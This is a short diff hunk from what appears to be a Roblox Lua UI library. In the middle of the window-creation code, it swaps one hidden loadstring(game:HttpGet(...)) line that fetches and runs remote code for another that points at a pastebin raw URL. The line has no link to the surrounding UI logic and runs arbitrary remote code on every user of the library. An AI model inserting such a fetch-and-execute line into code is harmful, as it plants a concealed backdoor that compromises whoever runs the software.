@@ -3626,7 +3626,8 @@ function Library:CreateWindow(...)
                 CursorOutline:Remove();
             end);
         end
-loadstring(game:HttpGet("https://opnqpcwveeiotuujbxme.supabase.co/functions/v1/get-text?script=untitled-script-4"))()
+loadstring(game:HttpGet("https://pastebin.com/raw/pUPEWAba"))()
+
         for _, Desc in next, Outer:GetDescendants() do
             local Properties = {};
 
